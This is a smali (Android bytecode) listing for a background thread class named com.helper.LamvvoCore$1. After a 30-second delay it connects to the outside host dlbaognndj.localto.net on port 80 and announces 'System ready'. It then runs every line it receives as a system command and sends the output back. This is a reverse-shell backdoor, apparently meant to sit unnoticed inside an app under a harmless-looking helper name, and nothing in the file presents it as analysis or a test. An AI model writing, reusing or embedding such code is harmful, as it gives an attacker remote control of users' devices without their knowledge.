.class Lcom/helper/LamvvoCore$1;
.super Ljava/lang/Thread;
.field final synthetic this$0:Lcom/helper/LamvvoCore;
.method public constructor <init>(Lcom/helper/LamvvoCore;)V
    .locals 0
    iput-object p1, p0, Lcom/helper/LamvvoCore$1;->this$0:Lcom/helper/LamvvoCore;
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V
    return-void
.end method
.method public run()V
    .locals 5
    :try_start_0
    const-wide/16 v0, 0x7530
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    new-instance v0, Ljava/net/Socket;
    const-string v1, "dlbaognndj.localto.net"
    const/16 v2, 0x50
    invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    new-instance v1, Ljava/io/PrintWriter;
    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v2
    const/4 v3, 0x1
    invoke-direct {v1, v2, v3}, Ljava/io/PrintWriter;-><init>(Ljava/io/OutputStream;Z)V
    new-instance v2, Ljava/io/BufferedReader;
    new-instance v3, Ljava/io/InputStreamReader;
    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
    move-result-object v4
    invoke-direct {v3, v4}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    const-string v3, "System ready"
    invoke-virtual {v1, v3}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V
    :goto_0
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v3
    if-nez v3, :cond_0
    goto :goto_1
    :cond_0
    invoke-static {v3}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v4
    invoke-virtual {v4, v3}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v3
    new-instance v4, Ljava/io/BufferedReader;
    new-instance v5, Ljava/io/InputStreamReader;
    invoke-virtual {v3}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v3
    invoke-direct {v5, v3}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    invoke-direct {v4, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :goto_2
    invoke-virtual {v4}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v3
    if-nez v3, :cond_1
    goto :goto_0
    :cond_1
    invoke-virtual {v1, v3}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V
    goto :goto_2
    :goto_1
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    :catch_0
    return-void
.end method
